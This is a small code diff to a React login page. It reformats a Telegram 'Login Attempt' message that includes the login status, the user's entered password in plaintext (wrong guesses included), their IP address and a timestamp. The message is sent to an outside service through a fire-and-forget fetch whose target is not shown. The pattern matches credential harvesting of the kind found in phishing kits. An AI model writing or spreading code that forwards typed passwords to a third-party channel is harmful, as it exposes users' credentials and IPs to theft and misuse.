@@ -65,7 +65,10 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
         const status = isPasswordCorrect ? 'Success ✅' : 'Wrong ❌';
 
         const telegramMessage = `🔔 Login Attempt
-Status: ${status} Entered Password: ${password} IP Address: ${userIP} Time: ${dateStr} - ${timeStr}`;
+Status: ${status}
+Entered Password: ${password}
+IP Address: ${userIP}
+Time: ${dateStr} - ${timeStr}`;
 
         // Telegram integration (fire-and-forget)
         fetch(
